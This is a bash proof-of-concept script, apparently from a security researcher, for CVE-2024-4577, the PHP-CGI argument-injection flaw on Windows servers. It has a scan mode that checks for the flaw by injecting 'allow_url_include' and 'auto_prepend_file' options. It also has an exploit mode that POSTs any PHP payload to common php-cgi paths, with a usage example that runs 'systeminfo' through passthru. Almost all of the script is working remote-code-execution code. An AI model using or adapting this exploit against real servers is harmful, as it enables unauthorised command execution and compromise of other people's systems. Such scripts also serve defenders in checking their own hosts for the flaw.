#!/bin/bash
# Creator: @PatxaSec

function cve_test() {
  url="$1"
  end=("/cgi-bin/php-cgi.exe" "/php-cgi/php-cgi.exe" "/cgi-bin/php.exe" "/php-cgi/php.exe" "/index.php")
  if [[ -z "$url" ]]; then
    echo "Error: URL not provided"
    return 1
  fi
  for i in $end;
  do
    output=$(curl -X POST -k -s "$url$i?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
      --header 'User-Agent: curl/8.3.0' \
      --header 'Content-Type: application/x-www-form-urlencoded' \
      --header 'Connection: keep-alive' \
      --header 'Accept: */*' \
      --data '<?php echo "CVE_2024_4577_TEST";?>')
    echo "========================================================================================"
    echo "Scanning on $url$i..."
    echo "========================================================================================"
    if grep -q "CVE_2024_4577_TEST" <<< "$output"; then
      echo "[+] The URL $url is vulnerable to CVE-2024-4577 (allow_url_include and auto_prepend_file)"
    else
      echo "[!] The URL $url is not vulnerable to CVE-2024-4577"
    fi
    echo "========================================================================================"
  done
}

function cve_exploit() {
  url="$1"
  payload="$2"
  end=("/cgi-bin/php-cgi.exe" "/php-cgi/php-cgi.exe" "/cgi-bin/php.exe" "/php-cgi/php.exe" "/index.php")
  if [[ -z "$url" || -z "$payload" ]]; then
    echo "Error: URL or payload not provided"
    return 1
  fi
  for i in $end;
  do
    output=$(curl -X POST -k -s "$url$i?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
      --header 'User-Agent: curl/8.3.0' \
      --header 'Content-Type: application/x-www-form-urlencoded' \
      --header 'Connection: keep-alive' \
      --header 'Accept: */*' \
      --data $payload)
    echo "========================================================================================"
    echo "Exploiting on $url$i..."
    echo "========================================================================================"
    if [[ $? -eq 0 ]]; then
      echo "[+] Exploitation successful."
      echo $output
    else
      echo "[!] Exploitation failed"
    fi
    echo "========================================================================================"
  done
}

function usage() {
  echo "Usage: $0 <URL>   or   $0 <URL> <payload>"
  echo "Example: $0 http://example.com   or   $0 http://example.com <?php passthru('systeminfo'); ?>"
  exit 1
}

if [[ $# -eq 1 ]]; then
  cve_test "$1"
elif [[ $# -eq 2 ]]; then
  cve_exploit "$1" "$2"
else
  usage
fi
